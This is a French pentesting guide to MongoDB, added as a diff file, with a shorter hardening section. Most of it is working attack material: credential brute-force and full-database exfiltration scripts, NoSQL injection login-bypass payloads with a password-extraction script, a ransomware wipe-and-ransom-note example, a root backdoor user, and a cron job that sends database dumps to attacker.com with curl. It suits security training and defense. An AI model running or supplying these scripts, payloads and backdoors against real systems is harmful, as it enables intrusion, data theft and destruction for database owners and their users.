@@ -1,0 +1,1235 @@
+# 🍃 MongoDB - Guide Complet
+
+Guide exhaustif pour l'énumération, l'exploitation et la sécurisation de MongoDB, une base NoSQL souvent mal configurée et exposée sans authentification.
+
+---
+
+## 📖 Concepts de Base
+
+### Qu'est-ce que MongoDB ?
+
+**MongoDB** est une base de données NoSQL orientée documents. En pentesting, MongoDB est une cible privilégiée car :
+- Souvent exposé sans authentification (legacy)
+- Port 27017 par défaut facilement identifiable
+- Injection NoSQL possible dans applications web
+- Accès direct aux données sans requêtes SQL complexes
+- Mauvaises configurations fréquentes
+- Interfaces web (mongo-express, mongodbmanager) mal sécurisées
+
+**Port MongoDB** :
+```
+27017   - MongoDB (défaut)
+27018   - Sharding
+27019   - Config server
+28017   - Web interface (legacy)
+```
+
+**Structure MongoDB** :
+```
+Database    → Base de données
+Collection  → Table (équivalent SQL)
+Document    → Ligne/enregistrement (format BSON/JSON)
+Field       → Colonne
+```
+
+---
+
+## 1️⃣ Reconnaissance et Scan
+
+### Détection de service
+
+**Nmap** :
+```bash
+# Scan basique
+nmap -p 27017 target.com
+
+# Scan avec version
+nmap -p 27017 -sV target.com
+
+# Scan complet MongoDB
+nmap -p 27017-27019,28017 -sV -sC target.com
+
+# Scripts MongoDB
+nmap -p 27017 --script mongodb-* target.com
+
+# Output
+nmap -p 27017 -sV -sC -oA mongodb_scan target.com
+```
+
+**Scripts Nmap MongoDB** :
+```bash
+# Info basiques
+nmap -p 27017 --script mongodb-info target.com
+
+# Databases
+nmap -p 27017 --script mongodb-databases target.com
+
+# Brute force
+nmap -p 27017 --script mongodb-brute target.com
+```
+
+**Banner Grabbing** :
+```bash
+# Netcat
+nc -nv target.com 27017
+
+# Telnet
+telnet target.com 27017
+```
+
+---
+
+### Énumération initiale
+
+**Test d'accès sans authentification** :
+```bash
+# Connexion basique
+mongo target.com
+
+# Port custom
+mongo target.com:27017
+
+# Avec database spécifique
+mongo target.com/admin
+
+# Test si auth requise
+mongo target.com --eval "db.version()"
+```
+
+---
+
+## 2️⃣ Connexion et Authentification
+
+### Connexion sans authentification
+
+```bash
+# Connexion simple
+mongo target.com
+
+# Si succès sans credentials = vulnérable!
+```
+
+---
+
+### Connexion avec authentification
+
+```bash
+# Avec credentials
+mongo mongodb://username:password@target.com/database
+
+# Format détaillé
+mongo --host target.com --port 27017 -u username -p password --authenticationDatabase admin
+
+# Avec SSL/TLS
+mongo mongodb://username:password@target.com/?ssl=true
+
+# Connection string complète
+mongo "mongodb://admin:password@target.com:27017/admin?authSource=admin"
+```
+
+---
+
+### Test de credentials par défaut
+
+**Credentials courants** :
+```
+admin:admin
+admin:password
+admin:(vide)
+root:root
+root:password
+mongodb:mongodb
+user:user
+```
+
+**Script de test** :
+```bash
+#!/bin/bash
+# mongo_test_creds.sh
+
+TARGET=$1
+
+CREDS=(
+    "admin:admin"
+    "admin:password"
+    "admin:"
+    "root:root"
+    "root:password"
+    "mongodb:mongodb"
+)
+
+echo "[*] Testing default credentials on $TARGET"
+
+for cred in "${CREDS[@]}"; do
+    USER=$(echo $cred | cut -d':' -f1)
+    PASS=$(echo $cred | cut -d':' -f2)
+    
+    echo "[*] Trying $USER:$PASS"
+    
+    if [ -z "$PASS" ]; then
+        mongo "mongodb://$USER@$TARGET/admin" --eval "db.version()" 2>/dev/null | grep -q "version" && echo "[+] SUCCESS: $USER:(empty)"
+    else
+        mongo "mongodb://$USER:$PASS@$TARGET/admin" --eval "db.version()" 2>/dev/null | grep -q "version" && echo "[+] SUCCESS: $USER:$PASS"
+    fi
+done
+```
+
+---
+
+## 3️⃣ Énumération des Bases
+
+### Commandes MongoDB Shell
+
+```javascript
+// Version MongoDB
+db.version()
+
+// Informations serveur
+db.serverStatus()
+
+// Informations build
+db.serverBuildInfo()
+
+// Liste des databases
+show dbs
+
+// Taille des databases
+db.adminCommand("listDatabases")
+
+// Database actuelle
+db
+
+// Changer de database
+use database_name
+
+// Liste des collections
+show collections
+
+// Statistiques database
+db.stats()
+
+// Informations utilisateur actuel
+db.runCommand({connectionStatus: 1})
+```
+
+---
+
+### Énumération des utilisateurs
+
+```javascript
+// Changer vers admin database
+use admin
+
+// Lister utilisateurs (requiert privilèges)
+db.getUsers()
+db.system.users.find()
+
+// Informations utilisateur actuel
+db.runCommand({connectionStatus: 1})
+
+// Rôles disponibles
+db.getRoles()
+```
+
+---
+
+### Énumération des collections
+
+```javascript
+// Changer de database
+use database_name
+
+// Lister collections
+show collections
+
+// Ou
+db.getCollectionNames()
+
+// Compter documents dans collection
+db.collection_name.count()
+
+// Statistiques collection
+db.collection_name.stats()
+
+// Premiers documents
+db.collection_name.find().limit(5)
+
+// Avec formatage
+db.collection_name.find().pretty()
+
+// Tous les documents
+db.collection_name.find()
+```
+
+---
+
+### Script d'énumération automatique
+
+```python
+#!/usr/bin/env python3
+# mongo_enum.py
+
+from pymongo import MongoClient
+from pymongo.errors import OperationFailure, ServerSelectionTimeoutError
+import sys
+
+def enumerate_mongodb(host, port=27017, username=None, password=None):
+    """Énumération complète MongoDB"""
+    
+    try:
+        # Connexion
+        if username and password:
+            uri = f"mongodb://{username}:{password}@{host}:{port}/admin"
+        else:
+            uri = f"mongodb://{host}:{port}/"
+        
+        client = MongoClient(uri, serverSelectionTimeoutMS=5000)
+        
+        print(f"[+] Connected to MongoDB at {host}:{port}")
+        
+        # Version
+        try:
+            version = client.server_info()['version']
+            print(f"[*] MongoDB version: {version}")
+        except:
+            pass
+        
+        # Databases
+        print("\n[*] Databases:")
+        try:
+            dbs = client.list_database_names()
+            for db_name in dbs:
+                db = client[db_name]
+                collections = db.list_collection_names()
+                print(f"  [+] {db_name} ({len(collections)} collections)")
+                
+                # Collections
+                for coll_name in collections[:5]:  # Limiter à 5
+                    coll = db[coll_name]
+                    count = coll.count_documents({})
+                    print(f"      - {coll_name} ({count} documents)")
+        except OperationFailure as e:
+            print(f"  [-] Access denied: {e}")
+        
+        # Users (si admin access)
+        print("\n[*] Users:")
+        try:
+            admin_db = client['admin']
+            users = admin_db.command("usersInfo")
+            for user in users.get('users', []):
+                print(f"  [+] {user['user']} - {user.get('roles', [])}")
+        except:
+            print("  [-] Cannot list users (insufficient privileges)")
+        
+        client.close()
+        
+    except ServerSelectionTimeoutError:
+        print(f"[-] Cannot connect to {host}:{port}")
+    except Exception as e:
+        print(f"[-] Error: {e}")
+
+if __name__ == "__main__":
+    if len(sys.argv) < 2:
+        print(f"Usage: {sys.argv[0]} <host> [port] [username] [password]")
+        sys.exit(1)
+    
+    host = sys.argv[1]
+    port = int(sys.argv[2]) if len(sys.argv) > 2 else 27017
+    username = sys.argv[3] if len(sys.argv) > 3 else None
+    password = sys.argv[4] if len(sys.argv) > 4 else None
+    
+    enumerate_mongodb(host, port, username, password)
+```
+
+---
+
+## 4️⃣ Brute Force
+
+### Hydra
+
+```bash
+# User connu
+hydra -l admin -P passwords.txt mongodb://target.com
+
+# Liste d'utilisateurs
+hydra -L users.txt -P passwords.txt mongodb://target.com
+
+# Port custom
+hydra -l admin -P passwords.txt mongodb://target.com:27017
+```
+
+---
+
+### Script Python
+
+```python
+#!/usr/bin/env python3
+# mongo_brute.py
+
+from pymongo import MongoClient
+from pymongo.errors import OperationFailure
+import sys
+
+def try_login(host, port, username, password):
+    """Essaie une combinaison user/pass"""
+    try:
+        uri = f"mongodb://{username}:{password}@{host}:{port}/admin"
+        client = MongoClient(uri, serverSelectionTimeoutMS=3000)
+        client.server_info()  # Force connection
+        client.close()
+        return True
+    except:
+        return False
+
+def brute_force(host, port, users, passwords):
+    """Brute force MongoDB"""
+    
+    print(f"[*] Starting MongoDB brute force on {host}:{port}")
+    print(f"[*] Users: {len(users)}, Passwords: {len(passwords)}\n")
+    
+    found = []
+    
+    for user in users:
+        for password in passwords:
+            if try_login(host, port, user.strip(), password.strip()):
+                print(f"[+] SUCCESS: {user.strip()}:{password.strip()}")
+                found.append((user.strip(), password.strip()))
+                break  # Next user
+    
+    return found
+
+if __name__ == "__main__":
+    if len(sys.argv) != 5:
+        print(f"Usage: {sys.argv[0]} <host> <port> <users_file> <passwords_file>")
+        sys.exit(1)
+    
+    host = sys.argv[1]
+    port = int(sys.argv[2])
+    
+    with open(sys.argv[3]) as f:
+        users = f.readlines()
+    
+    with open(sys.argv[4]) as f:
+        passwords = f.readlines()
+    
+    results = brute_force(host, port, users, passwords)
+    
+    if results:
+        print(f"\n[+] Found {len(results)} valid credentials")
+    else:
+        print("\n[-] No valid credentials found")
+```
+
+---
+
+## 5️⃣ Exfiltration de Données
+
+### Export manuel
+
+```javascript
+// Sélectionner database
+use sensitive_db
+
+// Export d'une collection (format JSON)
+db.users.find().forEach(function(doc) {
+    print(JSON.stringify(doc));
+});
+
+// Avec filtres
+db.users.find({role: "admin"}).forEach(function(doc) {
+    print(JSON.stringify(doc));
+});
+
+// Champs spécifiques
+db.users.find({}, {username: 1, password: 1, email: 1})
+```
+
+---
+
+### mongoexport
+
+```bash
+# Export d'une collection
+mongoexport --host target.com --port 27017 -d database -c collection -o output.json
+
+# Avec authentification
+mongoexport --host target.com -u admin -p password --authenticationDatabase admin -d database -c users -o users.json
+
+# Export CSV
+mongoexport --host target.com -d database -c users --type=csv --fields username,password,email -o users.csv
+
+# Toutes les collections d'une database
+for coll in $(mongo target.com/database --quiet --eval "db.getCollectionNames().join('\n')"); do
+    mongoexport --host target.com -d database -c $coll -o ${coll}.json
+done
+```
+
+---
+
+### mongodump
+
+```bash
+# Dump complet
+mongodump --host target.com --port 27017 --out /backup/
+
+# Database spécifique
+mongodump --host target.com -d database --out /backup/
+
+# Avec authentification
+mongodump --host target.com -u admin -p password --authenticationDatabase admin --out /backup/
+
+# Collection spécifique
+mongodump --host target.com -d database -c users --out /backup/
+
+# Avec compression
+mongodump --host target.com --gzip --out /backup/
+```
+
+---
+
+### Script Python d'exfiltration
+
+```python
+#!/usr/bin/env python3
+# mongo_exfil.py
+
+from pymongo import MongoClient
+import json
+import sys
+import os
+
+def exfiltrate_mongodb(host, port, output_dir, username=None, password=None):
+    """Exfiltre toutes les données MongoDB"""
+    
+    # Connexion
+    if username and password:
+        uri = f"mongodb://{username}:{password}@{host}:{port}/admin"
+    else:
+        uri = f"mongodb://{host}:{port}/"
+    
+    client = MongoClient(uri, serverSelectionTimeoutMS=5000)
+    
+    print(f"[+] Connected to {host}:{port}")
+    
+    if not os.path.exists(output_dir):
+        os.makedirs(output_dir)
+    
+    # Pour chaque database
+    for db_name in client.list_database_names():
+        if db_name in ['admin', 'config', 'local']:
+            continue
+        
+        print(f"[*] Exfiltrating database: {db_name}")
+        
+        db = client[db_name]
+        db_dir = os.path.join(output_dir, db_name)
+        
+        if not os.path.exists(db_dir):
+            os.makedirs(db_dir)
+        
+        # Pour chaque collection
+        for coll_name in db.list_collection_names():
+            print(f"  [+] Exfiltrating collection: {coll_name}")
+            
+            coll = db[coll_name]
+            documents = list(coll.find())
+            
+            # Sauvegarder en JSON
+            output_file = os.path.join(db_dir, f"{coll_name}.json")
+            with open(output_file, 'w') as f:
+                json.dump(documents, f, default=str, indent=2)
+            
+            print(f"      Saved {len(documents)} documents")
+    
+    client.close()
+    print(f"\n[+] Exfiltration complete: {output_dir}")
+
+if __name__ == "__main__":
+    if len(sys.argv) < 3:
+        print(f"Usage: {sys.argv[0]} <host> <output_dir> [port] [username] [password]")
+        sys.exit(1)
+    
+    host = sys.argv[1]
+    output_dir = sys.argv[2]
+    port = int(sys.argv[3]) if len(sys.argv) > 3 else 27017
+    username = sys.argv[4] if len(sys.argv) > 4 else None
+    password = sys.argv[5] if len(sys.argv) > 5 else None
+    
+    exfiltrate_mongodb(host, port, output_dir, username, password)
+```
+
+---
+
+## 6️⃣ Injection NoSQL
+
+### Principe
+
+Les injections NoSQL exploitent la structure JSON/BSON des requêtes MongoDB pour bypasser l'authentification ou extraire des données.
+
+### Bypass d'authentification
+
+**Application vulnérable** :
+```javascript
+// Code backend Node.js vulnérable
+app.post('/login', (req, res) => {
+    db.collection('users').findOne({
+        username: req.body.username,
+        password: req.body.password
+    }, (err, user) => {
+        if (user) res.send("Logged in");
+        else res.send("Invalid credentials");
+    });
+});
+```
+
+**Payloads d'injection** :
+```bash
+# POST request
+username[$ne]=invalid&password[$ne]=invalid
+
+# JSON
+{"username": {"$ne": null}, "password": {"$ne": null}}
+
+# Login bypass
+{"username": "admin", "password": {"$gt": ""}}
+
+# Regex injection
+{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
+```
+
+---
+
+### Extraction de données
+
+**Boolean-based** :
+```javascript
+// Tester existence d'un username
+{"username": {"$regex": "^a"}, "password": {"$ne": ""}}
+// Si succès, username commence par 'a'
+
+{"username": {"$regex": "^ad"}, "password": {"$ne": ""}}
+// Continue jusqu'à trouver le username complet
+```
+
+**Script d'exploitation** :
+```python
+#!/usr/bin/env python3
+# nosql_injection.py
+
+import requests
+import string
+
+def extract_password(url, username):
+    """Extract password via NoSQL injection"""
+    
+    password = ""
+    charset = string.printable
+    
+    print(f"[*] Extracting password for user: {username}")
+    
+    while True:
+        found = False
+        
+        for char in charset:
+            # Test si password commence par password+char
+            payload = {
+                "username": username,
+                "password": {"$regex": f"^{password}{char}"}
+            }
+            
+            r = requests.post(url, json=payload)
+            
+            if "success" in r.text.lower() or "logged" in r.text.lower():
+                password += char
+                print(f"[+] Password: {password}")
+                found = True
+                break
+        
+        if not found:
+            break
+    
+    return password
+
+if __name__ == "__main__":
+    import sys
+    
+    if len(sys.argv) != 3:
+        print(f"Usage: {sys.argv[0]} <login_url> <username>")
+        sys.exit(1)
+    
+    url = sys.argv[1]
+    username = sys.argv[2]
+    
+    password = extract_password(url, username)
+    print(f"\n[+] Final password: {password}")
+```
+
+---
+
+### Opérateurs MongoDB dangereux
+
+```javascript
+// Comparaison
+$ne     - Not equal
+$gt     - Greater than
+$gte    - Greater than or equal
+$lt     - Less than
+$lte    - Less than or equal
+
+// Logique
+$and    - And
+$or     - Or
+$not    - Not
+$nor    - Nor
+
+// Élément
+$exists - Field exists
+$type   - Field type
+
+// Évaluation
+$regex  - Regular expression
+$where  - JavaScript expression (TRÈS DANGEREUX)
+
+// Array
+$in     - In array
+$nin    - Not in array
+$all    - All elements
+
+// Exemple dangereux
+{"$where": "this.username == 'admin' || '1'=='1'"}
+// Exécute JavaScript côté serveur!
+```
+
+---
+
+## 7️⃣ Exploitation Avancée
+
+### JavaScript Injection ($where)
+
+**Si $where est autorisé** :
+```javascript
+// Sleep injection (time-based)
+{"$where": "sleep(5000) || true"}
+
+// Code execution
+{"$where": "function() { return true; }"}
+
+// Extraction de données
+{"$where": "this.password.match(/^a/) != null"}
+```
+
+---
+
+### Ransomware MongoDB
+
+**Attaque courante sur MongoDB exposé** :
+```javascript
+// Se connecter à MongoDB sans auth
+mongo target.com
+
+// Supprimer toutes les databases
+use database_name
+db.dropDatabase()
+
+// Créer collection avec message ransom
+db.SEND_BITCOIN_TO_THIS_ADDRESS.insert({
+    message: "Your data has been encrypted. Send 1 BTC to recover.",
+    bitcoin_address: "1ABC...",
+    contact: "evil@example.com"
+})
+```
+
+**Protection** : Toujours activer l'authentification !
+
+---
+
+## 8️⃣ Persistence
+
+### Créer utilisateur backdoor
+
+```javascript
+// Se connecter en admin
+use admin
+
+// Créer utilisateur avec tous les privilèges
+db.createUser({
+    user: "backdoor",
+    pwd: "SuperSecret123!",
+    roles: [
+        {role: "root", db: "admin"}
+    ]
+})
+
+// Vérifier
+db.getUsers()
+
+// Connexion future
+mongo mongodb://backdoor:SuperSecret123!@target.com/admin
+```
+
+---
+
+### Modifier utilisateur existant
+
+```javascript
+// Changer mot de passe
+db.changeUserPassword("existing_user", "NewPassword123")
+
+// Ajouter rôles
+db.grantRolesToUser("existing_user", [
+    {role: "root", db: "admin"}
+])
+```
+
+---
+
+### Scheduled backup exfiltration
+
+```bash
+# Sur système compromis avec MongoDB
+# Créer cron job pour dump régulier
+
+crontab -e
+
+# Ajouter
+0 */6 * * * mongodump --host localhost --out /tmp/backup && curl -F "file=@/tmp/backup.tar.gz" http://attacker.com/upload
+```
+
+---
+
+## 9️⃣ Protection et Mitigation
+
+### Activer l'authentification
+
+**Configuration MongoDB (/etc/mongod.conf)** :
+```yaml
+# Network interfaces
+net:
+  port: 27017
+  bindIp: 127.0.0.1  # Écouter seulement localhost
+
+# Security
+security:
+  authorization: enabled  # Activer auth
+
+# Storage
+storage:
+  dbPath: /var/lib/mongodb
+  journal:
+    enabled: true
+```
+
+**Créer admin user** :
+```javascript
+// Démarrer MongoDB sans auth
+mongo
+
+// Créer admin
+use admin
+db.createUser({
+    user: "admin",
+    pwd: "StrongPassword123!@#",
+    roles: [{role: "userAdminAnyDatabase", db: "admin"}]
+})
+
+// Redémarrer avec auth
+sudo systemctl restart mongod
+
+// Se connecter
+mongo -u admin -p StrongPassword123!@# --authenticationDatabase admin
+```
+
+---
+
+### Principe du moindre privilège
+
+```javascript
+// Utilisateur read-only pour une database
+use myapp_db
+db.createUser({
+    user: "app_readonly",
+    pwd: "password",
+    roles: [{role: "read", db: "myapp_db"}]
+})
+
+// Utilisateur read-write pour une database
+db.createUser({
+    user: "app_user",
+    pwd: "password",
+    roles: [{role: "readWrite", db: "myapp_db"}]
+})
+
+// Application-specific roles
+db.createRole({
+    role: "appRole",
+    privileges: [
+        {resource: {db: "myapp_db", collection: "users"}, actions: ["find", "insert"]},
+        {resource: {db: "myapp_db", collection: "logs"}, actions: ["insert"]}
+    ],
+    roles: []
+})
+```
+
+---
+
+### Firewall et réseau
+
+```bash
+# UFW (Ubuntu)
+sudo ufw allow from 192.168.1.0/24 to any port 27017
+sudo ufw deny 27017
+
+# iptables
+iptables -A INPUT -p tcp -s 192.168.1.0/24 --dport 27017 -j ACCEPT
+iptables -A INPUT -p tcp --dport 27017 -j DROP
+```
+
+---
+
+### Monitoring et Logging
+
+```yaml
+# /etc/mongod.conf
+
+# Logging
+systemLog:
+  destination: file
+  path: /var/log/mongodb/mongod.log
+  logAppend: true
+  verbosity: 1
+
+# Enable profiling
+# Dans MongoDB shell
+db.setProfilingLevel(2)  # Log toutes les opérations
+
+# Voir logs
+db.system.profile.find().pretty()
+```
+
+**Analyse des logs** :
+```bash
+# Failed auth attempts
+grep "Failed to authenticate" /var/log/mongodb/mongod.log
+
+# Connexions
+grep "connection accepted" /var/log/mongodb/mongod.log
+
+# Commandes suspectes
+grep -E "(dropDatabase|createUser|dropUser)" /var/log/mongodb/mongod.log
+```
+
+---
+
+### Validation NoSQL Injection
+
+**Node.js - Sanitization** :
+```javascript
+const mongoSanitize = require('express-mongo-sanitize');
+
+// Middleware pour supprimer les opérateurs
+app.use(mongoSanitize());
+
+// Ou validation manuelle
+function validateInput(input) {
+    if (typeof input !== 'string') {
+        throw new Error('Invalid input');
+    }
+    
+    // Supprimer caractères dangereux
+    return input.replace(/[$.]/g, '');
+}
+
+// Dans route
+app.post('/login', (req, res) => {
+    const username = validateInput(req.body.username);
+    const password = validateInput(req.body.password);
+    
+    db.collection('users').findOne({username, password}, ...);
+});
+```
+
+---
+
+## 🔟 Cas Pratiques
+
+### Scénario 1: MongoDB sans authentification
+
+```bash
+# Scan
+nmap -p 27017 --script mongodb-info target.com
+
+# Résultat: No authentication required
+
+# Connexion
+mongo target.com
+
+# Énumération
+show dbs
+use sensitive_db
+show collections
+db.users.find().pretty()
+
+# Exfiltration
+mongoexport --host target.com -d sensitive_db -c users -o users.json
+
+# Persistence
+use admin
+db.createUser({
+    user: "backdoor",
+    pwd: "Secret123",
+    roles: [{role: "root", db: "admin"}]
+})
+```
+
+---
+
+### Scénario 2: NoSQL Injection Web
+
+```bash
+# Application de login vulnérable
+# POST /login
+
+# Payload
+curl -X POST http://target.com/login \
+     -H "Content-Type: application/json" \
+     -d '{"username": {"$ne": null}, "password": {"$ne": null}}'
+
+# Résultat: Logged in as admin
+
+# Extraction de password
+python3 nosql_injection.py http://target.com/login admin
+# Password extrait: Admin@2024
+```
+
+---
+
+### Scénario 3: Credentials trouvées
+
+```bash
+# Dans fichier config trouvé
+cat .env
+MONGO_URI=mongodb://admin:P@ssw0rd@db.internal.com:27017/app
+
+# Connexion
+mongo mongodb://admin:P@ssw0rd@db.internal.com:27017/admin
+
+# Escalade
+db.grantRolesToUser("admin", [{role: "root", db: "admin"}])
+
+# Dump complet
+mongodump --host db.internal.com -u admin -p 'P@ssw0rd' --out /tmp/dump/
+```
+
+---
+
+## 1️⃣1️⃣ Cheatsheet Rapide
+
+```bash
+# === RECONNAISSANCE ===
+
+# Scan
+nmap -p 27017 -sV --script mongodb-* target.com
+
+# Connexion
+mongo target.com
+mongo mongodb://user:pass@target.com/admin
+
+
+# === ÉNUMÉRATION ===
+
+# Databases
+show dbs
+use database_name
+
+# Collections
+show collections
+db.collection.find().pretty()
+
+# Users
+use admin
+db.getUsers()
+
+
+# === BRUTE FORCE ===
+
+# Hydra
+hydra -l admin -P passwords.txt mongodb://target.com
+
+# Script Python
+python3 mongo_brute.py target.com 27017 users.txt passwords.txt
+
+
+# === EXFILTRATION ===
+
+# Export
+mongoexport --host target.com -d db -c collection -o output.json
+
+# Dump
+mongodump --host target.com --out /backup/
+
+# Script
+python3 mongo_exfil.py target.com /output/
+
+
+# === INJECTION NoSQL ===
+
+# Bypass login
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": "admin", "password": {"$gt": ""}}
+
+# Regex
+{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
+
+
+# === PERSISTENCE ===
+
+# Créer user
+use admin
+db.createUser({
+    user: "backdoor",
+    pwd: "password",
+    roles: [{role: "root", db: "admin"}]
+})
+
+
+# === SÉCURISATION ===
+
+# Config /etc/mongod.conf
+security:
+  authorization: enabled
+net:
+  bindIp: 127.0.0.1
+
+# Créer admin
+use admin
+db.createUser({
+    user: "admin",
+    pwd: "StrongPassword",
+    roles: ["userAdminAnyDatabase"]
+})
+```
+
+---
+
+## 1️⃣2️⃣ Ressources
+
+**Documentation** :
+- **MongoDB Manual** : https://docs.mongodb.com/manual/
+- **MongoDB Security** : https://docs.mongodb.com/manual/security/
+
+**Outils** :
+- **pymongo** : https://pymongo.readthedocs.io/
+- **Hydra** : https://github.com/vanhauser-thc/thc-hydra
+- **NoSQLMap** : https://github.com/codingo/NoSQLMap
+
+**Exploitation** :
+- **HackTricks MongoDB** : https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb
+- **PayloadsAllTheThings NoSQL** : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
+- **OWASP NoSQL** : https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
+
+**Labs** :
+- **HackTheBox** : MongoDB challenges
+- **TryHackMe** : NoSQL injection rooms
+- **PortSwigger** : NoSQL injection labs
+
+---
+
+## 1️⃣3️⃣ Tips Pro
+
+1. **Toujours tester sans auth d'abord** : beaucoup de MongoDB legacy exposés
+2. **Port 27017 = target facile** : scans Internet massifs
+3. **NoSQL injection sous-estimée** : aussi dangereux que SQL injection
+4. **$where = RCE potentiel** : exécution JavaScript côté serveur
+5. **Ransomware MongoDB courant** : milliers de bases compromises
+6. **Authentification désactivée fréquent** : installation par défaut
+7. **bindIp critique** : 0.0.0.0 expose à Internet
+8. **Regex injection efficace** : extraction caractère par caractère
+9. **pymongo pour scripts** : automatisation facile
+10. **mongo-express dangereux** : interface web souvent exposée
+11. **Backup exfiltration** : mongodump complet et rapide
+12. **Logs importants** : surveiller createUser, dropDatabase
+13. **TLS recommandé** : chiffrement en transit
+14. **Sharding complexity** : plus de services = plus de surface d'attaque
+15. **Cloud MongoDB** : Atlas plus sécurisé mais vérifier config
+
+**Workflow recommandé** :
+```bash
+# 1. Reconnaissance
+nmap -p 27017 -sV --script mongodb-* target.com
+
+# 2. Test sans auth
+mongo target.com --eval "db.version()"
+
+# 3. Si auth requise, brute force
+python3 mongo_brute.py target.com 27017 users.txt passwords.txt
+
+# 4. Énumération
+mongo target.com  # ou avec creds
+show dbs
+use database_name
+show collections
+db.collection.find().limit(10)
+
+# 5. Exfiltration
+mongodump --host target.com --out /backup/
+# ou
+python3 mongo_exfil.py target.com /output/
+
+# 6. Persistence
+use admin
+db.createUser({
+    user: "backdoor",
+    pwd: "Secret123",
+    roles: [{role: "root", db: "admin"}]
+})
+
+# 7. Cleanup (si nécessaire)
+db.dropUser("backdoor")
+```
+
+**Configuration sécurisée complète** :
+```yaml
+# /etc/mongod.conf
+
+# Réseau
+net:
+  port: 27017
+  bindIp: 127.0.0.1  # Ou IP interne seulement
+  ssl:
+    mode: requireSSL
+    PEMKeyFile: /etc/ssl/mongodb.pem
+
+# Sécurité
+security:
+  authorization: enabled
+  javascriptEnabled: false  # Désactiver $where
+
+# Logging
+systemLog:
+  destination: file
+  path: /var/log/mongodb/mongod.log
+  logAppend: true
+  verbosity: 1
+
+# Audit (Enterprise)
+auditLog:
+  destination: file
+  format: JSON
+  path: /var/log/mongodb/audit.json
+
+# Storage
+storage:
+  dbPath: /var/lib/mongodb
+  journal:
+    enabled: true
+  engine: wiredTiger
+  wiredTiger:
+    engineConfig:
+      cacheSizeGB: 2
+```
+
+---
+
+**🎯 MongoDB = cible NoSQL #1. Maîtrisez injection NoSQL et sécurisation !**
+
+**Tags:** `#mongodb #nosql #nosql-injection #database #enumeration #exfiltration #ransomware #authentication-bypass #persistence #pymongo`
